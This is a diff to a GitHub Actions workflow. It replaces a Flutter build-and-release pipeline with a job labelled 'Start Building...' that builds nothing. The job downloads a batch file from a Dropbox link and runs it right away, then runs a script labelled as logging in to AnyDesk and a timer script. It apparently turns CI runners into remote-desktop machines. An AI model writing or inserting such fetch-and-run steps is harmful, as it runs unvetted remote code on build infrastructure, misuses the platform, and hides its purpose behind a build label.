@@ -1,42 +1,20 @@
+name: programmingwithkumaresan
+
 on:
-  pull_request:
-    branches:
-      - main
-      - master
-  push:
-    branches:
-      - main
-      - master
-      - develop
-name: "Build & Release"
+  workflow_dispatch:
+
 jobs:
   build:
-    name: Build & Release
-    runs-on: macos-latest
+    name: Start Building...
+    runs-on: windows-latest
     steps:
-      - uses: actions/checkout@v3
-      - uses: actions/setup-java@v3
-        with:
-          distribution: 'zulu'
-          java-version: '21'
-      - uses: subosito/flutter-action@v2
-        with:
-          channel: 'stable'
-          architecture: x64
-      - run: flutter clean
-      - run: flutter pub get
-      - run: flutter build apk --debug
-      - name: Push to Releases
-        uses: ncipollo/release-action@v1
-        with:
-          artifacts: "build/app/outputs/apk/release/*"
-          tag: v1.0.${{ github.run_number }}
-          token: ${{ secrets.TOKEN }}
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
 
+      - name: Log In To AnyDesk
+        run: cmd /c show.bat
 
-
-
-
-
-# push to master, main, develop
-# pull request on main master
+      - name: Time Counter
+        run: python time.py
